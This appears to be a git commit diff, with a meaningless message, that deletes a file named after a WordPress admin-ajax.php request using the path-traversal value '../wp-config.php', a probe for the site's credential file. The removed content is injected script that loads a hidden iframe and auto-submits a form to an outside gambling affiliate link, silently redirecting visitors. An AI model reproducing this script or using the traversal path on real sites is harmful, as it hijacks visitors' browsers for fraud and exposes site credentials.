ddcffac6fb4cb9b5c7d597cd950e6838f31603e4
playfortyna <>
2021-06-02 09:44:37 +0700

    agag
    agag

--- wp-admin/admin-ajax.php__s-quest__action=..%2Fwp-config.php
+++
@@ -1,7 +0,0 @@
-<script>
-            function go() {
-               window.frames[0].document.body.innerHTML = '<form target="_parent" method="post" action="https://mobywin7.com/?s=52&ref=wp_w58879p157_eldrdrbt&url=register&click_id=1ug39jk3bod74"></form>';
-                window.frames[0].document.forms[0].submit()
-            }
-        </script>
-        <iframe onload="window.setTimeout('go()', 99)" src="about:blank" style="visibility:hidden"></iframe>
